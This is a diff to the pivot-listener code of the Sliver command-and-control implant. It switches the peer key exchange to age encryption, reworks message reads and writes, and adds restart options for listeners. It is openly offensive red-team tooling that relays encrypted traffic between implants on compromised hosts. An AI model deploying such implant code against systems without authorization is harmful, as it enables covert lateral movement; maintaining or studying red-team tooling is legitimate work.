@@ -21,9 +21,9 @@ package pivots
 import (
 	"bytes"
 	"crypto/rand"
-	"encoding/base64"
 	"encoding/binary"
 	"errors"
+	"io"
 	"net"
 	"sync"
 	"time"
@@ -36,10 +36,6 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
-)
-
-const (
-	readBufSize = 1024
 )
 
 var (
@@ -75,7 +71,7 @@ func generatePeerID() int64 {
 }
 
 // CreateListener - Generic interface to a start listener function
-type CreateListener func(string, chan<- *pb.Envelope) (*PivotListener, error)
+type CreateListener func(string, chan<- *pb.Envelope, ...bool) (*PivotListener, error)
 
 // GetListeners - Get a list of active listeners
 func GetListeners() []*pb.PivotListener {
@@ -109,18 +105,19 @@ func RestartAllListeners(send chan<- *pb.Envelope) {
 	stoppedPivotListeners.Range(func(key, value interface{}) bool {
 		stoppedListener := value.(*PivotListener)
 		if createListener, ok := SupportedPivotListeners[stoppedListener.Type]; ok {
-			listener, err := createListener(stoppedListener.BindAddress, send)
+			listener, err := createListener(stoppedListener.BindAddress, send, stoppedListener.Options...)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[pivot] failed to restart listener: %s", err)
 				// {{end}}
+				return false
 			}
 			go listener.Start()
 			AddListener(listener)
 		}
 		return true
 	})
-	stoppedPivotListeners = nil
+	stoppedPivotListeners = &sync.Map{}
 }
 
 // StopAllListeners - Stop all pivot listeners
@@ -210,6 +207,7 @@ type PivotListener struct {
 	PivotConnections *sync.Map // PeerID (int64) -> NetConnPivot
 	BindAddress      string
 	Upstream         chan<- *pb.Envelope
+	Options          []bool
 }
 
 // ToProtobuf - Get the protobuf version of the pivot listener
@@ -304,7 +302,7 @@ func (p *NetConnPivot) ToProtobuf() *pb.NetConnPivot {
 	}
 }
 
-// Start - Starts the TCP pivot connection handler
+// Start - Starts the pivot connection handler
 func (p *NetConnPivot) Start(pivots *sync.Map) {
 	defer func() {
 		p.conn.Close()
@@ -410,19 +408,18 @@ func (p *NetConnPivot) peerKeyExchange() error {
 		return ErrFailedKeyExchange
 	}
 	p.downstreamPeerID = peerHello.PeerID
-	sessionKey := cryptography.RandomKey()
+	sessionKey := cryptography.RandomSymmetricKey()
 	p.cipherCtx = cryptography.NewCipherContext(sessionKey)
-	ciphertext, err := cryptography.ECCEncryptToPeer(peerHello.PublicKey, peerHello.PublicKeySignature, sessionKey[:])
+	ciphertext, err := cryptography.AgeEncryptToPeer(peerHello.PublicKey, peerHello.PublicKeySignature, sessionKey[:])
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[pivot] peer encryption failure: %s", err)
 		// {{end}}
 		return ErrFailedKeyExchange
 	}
-	publicKeyRaw, _ := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
 	peerResponse, _ := proto.Marshal(&pb.PivotHello{
-		PublicKey:          publicKeyRaw,
-		PublicKeySignature: cryptography.ECCPublicKeySignature,
+		PublicKey:          []byte(cryptography.PeerAgePublicKey),
+		PublicKeySignature: cryptography.PeerAgePublicKeySignature,
 		SessionKey:         ciphertext,
 	})
 	p.conn.SetWriteDeadline(time.Now().Add(tcpPivotWriteDeadline))
@@ -459,8 +456,13 @@ func (p *NetConnPivot) write(message []byte) error {
 	}
 
 	total := 0
+	chunk := 1024
 	for total < len(message) {
-		n, err = p.conn.Write(message[total:])
+		if total+chunk <= len(message) {
+			n, err = p.conn.Write(message[total : total+chunk])
+		} else {
+			n, err = p.conn.Write(message[total:])
+		}
 		total += n
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -469,6 +471,7 @@ func (p *NetConnPivot) write(message []byte) error {
 			return err
 		}
 	}
+
 	return nil
 }
 
@@ -476,7 +479,9 @@ func (p *NetConnPivot) read() ([]byte, error) {
 	p.readMutex.Lock()
 	defer p.readMutex.Unlock()
 	dataLengthBuf := make([]byte, 4)
-	n, err := p.conn.Read(dataLengthBuf)
+
+	n, err := io.ReadFull(p.conn, dataLengthBuf)
+
 	if err != nil || n != 4 {
 		// {{if .Config.Debug}}
 		log.Printf("[pivot] Error (read msg-length): %v\n", err)
@@ -485,23 +490,23 @@ func (p *NetConnPivot) read() ([]byte, error) {
 	}
 
 	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
-	readBuf := make([]byte, readBufSize)
-	dataBuf := []byte{}
-	totalRead := 0
-	for {
-		n, err := p.conn.Read(readBuf)
-		dataBuf = append(dataBuf, readBuf[:n]...)
-		totalRead += n
-		if totalRead == dataLength {
-			break
-		}
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("[pivot] read error: %s\n", err)
-			// {{end}}
-			return nil, err
-		}
+	if dataLength <= 0 {
+		// {{if .Config.Debug}}
+		log.Printf("[pivot] read error: %s\n", err)
+		// {{end}}
+		return nil, errors.New("[pivot] zero data length")
 	}
+	dataBuf := make([]byte, dataLength)
+
+	n, err = io.ReadFull(p.conn, dataBuf)
+
+	if err != nil || n != dataLength {
+		// {{if .Config.Debug}}
+		log.Printf("[pivot] read error: %s\n", err)
+		// {{end}}
+		return nil, err
+	}
+
 	return dataBuf, err
 }
 
